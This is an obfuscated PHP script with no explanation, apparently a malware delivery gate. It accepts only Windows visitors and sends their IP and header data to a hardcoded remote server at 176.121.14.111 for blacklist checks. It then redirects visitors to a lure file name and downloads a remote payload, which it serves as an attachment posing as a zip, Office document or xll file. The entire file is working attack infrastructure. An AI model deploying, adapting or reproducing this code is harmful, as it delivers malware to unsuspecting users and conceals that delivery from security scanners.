<?php ini_set('display_errors',0);ini_set('display_startup_errors',0);error_reporting(E_ALL);function generateRandomString($x0=10){$v1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';$r2=strlen($v1);$f3='';for($e4=0;$e4<$x0;$e4++){$f3.=$v1[rand(0,$r2-1)];}return $f3;}$x5='2.1.4356457345';$r6='charts';if(session_start()===false){exit('');}$p7=$_SERVER['REQUEST_URI'];if(stripos($p7,'logotype.jpg')!==false){$_SESSION['has_logo']=true;exit();}if(empty($p7)){exit('');}$b8=explode("/",$p7);if(count($b8)!=3){exit('');}$_GET['e']=$b8[2];if(empty($_SERVER['HTTP_USER_AGENT'])){exit('');}if(stripos($_SERVER['HTTP_USER_AGENT'],'Windows')===false){exit('');}function getRealIpAddr(){if(!empty($_SERVER['HTTP_CLIENT_IP'])){$f9=$_SERVER['HTTP_CLIENT_IP'];}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){$f9=$_SERVER['HTTP_X_FORWARDED_FOR'];}else{$f9=$_SERVER['REMOTE_ADDR'];}return $f9;}$n10=array();$n11=getallheaders();foreach($n11 as $v12=>$v13){$x14=strtolower($v12);$n10[$x14]=$v13;}$i15=explode(".",$_GET['e']);$i15=end($i15);if(!in_array($i15,['zip','xls','doc','xll'])){$i15='zip';}$t16=["ip"=>getRealIpAddr(),"time"=>time(),"hh"=>$n10['hh'],"ext"=>$i15,"host"=>$_SERVER['SERVER_NAME'],"filename"=>$_GET['e'],];$t16=json_encode($t16);$t16=base64_encode($t16);$k17=getRealIpAddr();$w18=['http://176.121.14.111/router_black.php?ip='.$k17.'&data='.$t16.'&version='.$x5.'&alanpo='.$n10['alanpo'],'http://176.121.14.111/router_black.php?ip='.$k17.'&data='.$t16.'&version='.$x5.'&alanpo='.$n10['alanpo'],'http://176.121.14.111/router_black.php?ip='.$k17.'&data='.$t16.'&version='.$x5.'&alanpo='.$n10['alanpo'],];$c19=false;$y20=false;foreach($w18 as $z21){$x22=stream_context_create(array('http'=>array('timeout'=>10,)));$l23=@file_get_contents($z21,false,$x22);$r24=json_decode($l23,true);if($r24['status']===true){$c19=$r24['is_black'];$r6=$r24['REDIRECT_FILENAME'];$y20=$r24['is_HH'];break;}}if($c19){exit('');}if(!$y20){if($_GET['e']!=$r6.".".$i15){$_SESSION['__redirect_was_start']=true;$_SESSION['doc_name']=$_GET['e'];if(stripos($_SESSION['doc_name'],'.'.$i15)===false){$_SESSION['doc_name'].='.'.$i15;}$_SESSION['file_ext']=$i15;$k25=str_replace($_GET['e'],$r6.".".$i15,$p7);$m26=generateRandomString(rand(2,8));echo "<html><body>";echo '<span id="'.$m26.'" data-'.$m26.'="'.$k25.'"></span>';echo "<script>";echo "location.pathname = document.getElementById('".$m26."').getAttribute('data-".$m26."');";echo "</script>";echo "</body></html>";exit();}}if(empty($_SESSION['file_ext'])){$_SESSION['file_ext']='zip';}if(empty($n10['hh'])&&$_GET['e']!=$r6.".".$i15){exit();}$t27=2;$s28=['http://176.121.14.111/router08.php?pp='.$t16.'&version='.$x5.'&resp_version='.$t27,'http://176.121.14.111/router08.php?pp='.$t16.'&version='.$x5.'&resp_version='.$t27,'http://176.121.14.111/router08.php?pp='.$t16.'&version='.$x5.'&resp_version='.$t27,];shuffle($s28);$y29=__DIR__.'/../big__stat.txt';if(empty($_SESSION['doc_name'])){$_SESSION['doc_name']=$r6.".".$i15;}foreach($s28 as $n30){$x22=stream_context_create(array('http'=>array('timeout'=>30,)));$n31=@file_get_contents($n30,false,$x22);if($n31=='....'||$n31=='...'){break;}if(strlen($n31)<1000){continue;}$z32=$n31;$j33=$_SESSION['doc_name'];if($t27==2){$q34=json_decode($n31,true);$j33=$r6.'.'.$q34['format'];$z32=base64_decode($q34['data']);}header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename='.$j33);header('Content-Transfer-Encoding: binary');header('Connection: Keep-Alive');header('Expires: 0');header('Cache-Control: must-revalidate, post-check=0, pre-check=0');header('Pragma: public');echo $z32;exit;}?>